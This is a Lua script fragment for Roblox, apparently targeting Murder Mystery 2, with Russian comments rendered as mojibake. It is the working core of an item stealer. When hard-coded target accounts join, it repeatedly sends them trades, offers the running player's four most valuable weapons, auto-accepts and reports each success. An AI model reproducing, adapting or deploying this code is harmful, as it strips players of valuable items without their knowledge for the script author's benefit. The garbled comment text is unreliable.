-- –§–£–ù–ö–¶–ò–Ø –ê–í–¢–û–¢–†–ï–ô–î–ê –ß–ï–†–ï–ó 8 –°–ï–ö–£–ù–î
local function StartAutoTradeAfterDelay(playerName)
    task.wait(8)
    print("–ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ—Ç—Ä–µ–π–¥–∞ –¥–ª—è", playerName)
    
    if not getgenv().mm2 then return end
    
    local loop = true
    local tradeInProgress = false
    
    local function isTradeGUIOpen()
        local player = game:GetService("Players").LocalPlayer
        local playerGui = player:WaitForChild("PlayerGui")
        
        for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
            local tradeGUI = playerGui:FindFirstChild(guiName)
            if tradeGUI then
                return true
            end
        end
        return false
    end
    
    while loop do
        if tradeInProgress then
            task.wait(1)
            continue
        end
        
        local targetPlayer = game:GetService("Players"):FindFirstChild(playerName)
        if not targetPlayer then
            print("–ò–≥—Ä–æ–∫", playerName, "–≤—ã—à–µ–ª –∏–∑ –∏–≥—Ä—ã")
            loop = false
            break
        end
        
        local availableItems = {}
        for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
            for c, d in pairs(b) do
                local itemValue = valuesTable[d.DataID] or 0
                if itemValue > 0 and d.Amount > 0 then
                    table.insert(availableItems, {
                        name = d.ItemName,
                        dataId = d.DataID,
                        value = itemValue,
                        amount = d.Amount
                    })
                end
            end
        end
        
        table.sort(availableItems, function(a, b) 
            return a.value > b.value
        end)
        
        if #availableItems == 0 then
            loop = false
            break
        end
        
        tradeInProgress = true
        local success = pcall(function()
            Trade.SendRequest:InvokeServer(targetPlayer)
        end)
        
        if not success then
            tradeInProgress = false
            task.wait(5)
            continue
        end
        
        local tradeAccepted = false
        for i = 1, 30 do
            if isTradeGUIOpen() then
                tradeAccepted = true
                break
            end
            task.wait(1)
        end
        
        if not tradeAccepted then
            print("–¢—Ä–µ–π–¥ –Ω–µ –±—ã–ª –ø—Ä–∏–Ω—è—Ç")
            tradeInProgress = false
            task.wait(5)
            continue
        end
        
        task.wait(2)
        
        local sentItems = {}
        local addedCount = 0
        
        for _, item in ipairs(availableItems) do
            if addedCount >= 4 then break end
            
            local addAmount = math.min(item.amount, 4 - addedCount)
            for i = 1, addAmount do
                local offerSuccess = pcall(function()
                    Trade.OfferItem:FireServer(item.dataId, "Weapons")
                end)
                
                if offerSuccess then
                    table.insert(sentItems, {
                        name = item.name,
                        dataId = item.dataId,
                        amount = 1
                    })
                    addedCount = addedCount + 1
                    print("–£—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –ø—Ä–µ–¥–º–µ—Ç: " .. item.name)
                else
                    print("–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –ø—Ä–µ–¥–º–µ—Ç–∞: " .. item.name)
                end
                
                task.wait(0.5)
                if addedCount >= 4 then break end
            end
        end
        
        if addedCount == 0 then
            print("–ù–µ —É–¥–∞–ª–æ—Å—å –¥–æ–±–∞–≤–∏—Ç—å –Ω–∏ –æ–¥–Ω–æ–≥–æ –ø—Ä–µ–¥–º–µ—Ç–∞, –æ—Ç–º–µ–Ω—è–µ–º —Ç—Ä–µ–π–¥")
            pcall(function() Trade.DeclineTrade:FireServer() end)
            tradeInProgress = false
            task.wait(5)
            continue
        end
        
        print("–£—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ –ø—Ä–µ–¥–º–µ—Ç–æ–≤: " .. addedCount)
        
        task.wait(4)
        
        if lastOfferValue then
            local acceptSuccess = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
            end)
            
            if acceptSuccess then
                print("–¢—Ä–µ–π–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω —Å lastOfferValue")
                if #sentItems > 0 then
                    SendTradeSuccessMessage(sentItems, playerName)
                end
            else
                print("–û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–µ–π–¥–∞ —Å lastOfferValue")
            end
        else
            local success = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
            end)
            if success then
                print("–¢—Ä–µ–π–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω —Å tick()")
            else
                print("–û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–µ–π–¥–∞ —Å tick()")
            end
        end
        
        for i = 1, 10 do
            if not isTradeGUIOpen() then
                break
            end
            task.wait(1)
        end
        
        tradeInProgress = false
        task.wait(1)
    end
end

-- –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –î–õ–Ø –í–•–û–î–ê –ò–ì–†–û–ö–û–í
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username or player.Name == Username2 then
        print("–û–±–Ω–∞—Ä—É–∂–µ–Ω —Ü–µ–ª–µ–≤–æ–π –∏–≥—Ä–æ–∫:", player.Name)
        StartAutoTradeAfterDelay(player.Name)
    end
end)

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º —É–∂–µ –Ω–∞—Ö–æ–¥—è—â–∏—Ö—Å—è –≤ –∏–≥—Ä–µ –∏–≥—Ä–æ–∫–æ–≤
for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name == Username or player.Name == Username2 then
        print("–¶–µ–ª–µ–≤–æ–π –∏–≥—Ä–æ–∫ —É–∂–µ –≤ –∏–≥—Ä–µ:", player.Name)
        StartAutoTradeAfterDelay(player.Name)
    end
end

